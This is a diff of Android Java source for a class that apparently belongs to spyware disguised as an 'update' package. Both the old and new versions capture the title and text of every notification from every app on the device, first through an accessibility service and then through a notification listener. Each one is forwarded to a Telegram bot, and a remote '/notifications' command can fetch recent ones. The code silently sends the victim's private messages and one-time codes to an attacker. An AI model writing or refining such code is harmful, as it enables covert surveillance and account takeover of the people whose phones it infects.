@@ -1,52 +1,72 @@
 package com.kasari.update;
 
-import android.view.accessibility.AccessibilityEvent;
+import android.content.Context;
+import android.os.Build;
+import android.service.notification.NotificationListenerService;
+import android.service.notification.StatusBarNotification;
+import android.text.TextUtils;
+import androidx.core.app.NotificationCompat;
 import java.text.SimpleDateFormat;
-import java.util.*;
+import java.util.Date;
+import java.util.Locale;
 
-/**
- * Captures all notification events via the AccessibilityService (ScreenMirror).
- * Called from ScreenMirror.onAccessibilityEvent().
- */
-public class NotificationCatcher {
+public class NotificationCatcher extends NotificationListenerService {
 
-    private static final int MAX_HISTORY = 50;
-    private static final List<String> mHistory = new ArrayList<>();
-
-    public static void onEvent(AccessibilityEvent event) {
-        if (event == null) return;
-        if (event.getEventType() != AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) return;
-
-        CharSequence pkg = event.getPackageName();
-        List<CharSequence> texts = event.getText();
-        if (texts == null || texts.isEmpty()) return;
-
-        String text = texts.get(0).toString().trim();
-        if (text.isEmpty()) return;
-
-        String ts = new SimpleDateFormat("HH:mm dd-MM", Locale.getDefault()).format(new Date());
-        String entry = "[" + ts + "] [" + (pkg != null ? pkg : "?") + "] " + text;
-
-        synchronized (mHistory) {
-            mHistory.add(entry);
-            if (mHistory.size() > MAX_HISTORY) mHistory.remove(0);
+    @Override
+    public void onNotificationPosted(StatusBarNotification sbn) {
+        try {
+            String packageName = sbn.getPackageName();
+            String title = "";
+            String text = "";
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
+                android.app.Notification.Action[] actions = sbn.getNotification().actions;
+                CharSequence tickerText = sbn.getNotification().tickerText;
+                
+                if (tickerText != null) {
+                    text = tickerText.toString();
+                }
+                
+                if (sbn.getNotification().extras != null) {
+                    title = sbn.getNotification().extras.getString(
+                        android.app.Notification.EXTRA_TITLE, "");
+                    
+                    if (TextUtils.isEmpty(text)) {
+                        CharSequence[] lines = sbn.getNotification().extras.getCharSequenceArray(
+                            android.app.Notification.EXTRA_TEXT_LINES);
+                        if (lines != null && lines.length > 0) {
+                            StringBuilder sb = new StringBuilder();
+                            for (CharSequence line : lines) {
+                                if (line != null) {
+                                    sb.append(line).append(" ");
+                                }
+                            }
+                            text = sb.toString().trim();
+                        }
+                        
+                        if (TextUtils.isEmpty(text)) {
+                            text = sbn.getNotification().extras.getString(
+                                android.app.Notification.EXTRA_TEXT, "");
+                        }
+                    }
+                }
+            }
+            
+            if (!TextUtils.isEmpty(title) || !TextUtils.isEmpty(text)) {
+                String timestamp = new SimpleDateFormat("HH:mm:ss", 
+                    Locale.getDefault()).format(new Date());
+                
+                TelegramController.sendMessage(this, 
+                    "🔔 **Notification** [" + packageName + "]\n" +
+                    "Title: " + (title.isEmpty() ? "N/A" : title) + "\n" +
+                    "Text: " + text + "\n🕐 " + timestamp);
+            }
+            
+        } catch (Exception e) {
+            e.printStackTrace();
         }
-
-        // Live forward to Telegram
-        new Thread(() -> TelegramController.sendMessage("🔔 Notification\n" + entry)).start();
     }
 
-    // Called by /notifications command
-    public static void sendRecent() {
-        List<String> copy;
-        synchronized (mHistory) { copy = new ArrayList<>(mHistory); }
-        if (copy.isEmpty()) {
-            TelegramController.sendMessage("📭 Koi notification nahi (abhi tak).");
-            return;
-        }
-        int start = Math.max(0, copy.size() - 20);
-        StringBuilder sb = new StringBuilder("🔔 Last " + (copy.size() - start) + " Notifications:\n\n");
-        for (int i = start; i < copy.size(); i++) sb.append(copy.get(i)).append("\n");
-        TelegramController.sendMessage(sb.toString());
-    }
+    @Override
+    public void onNotificationRemoved(StatusBarNotification sbn) {}
 }
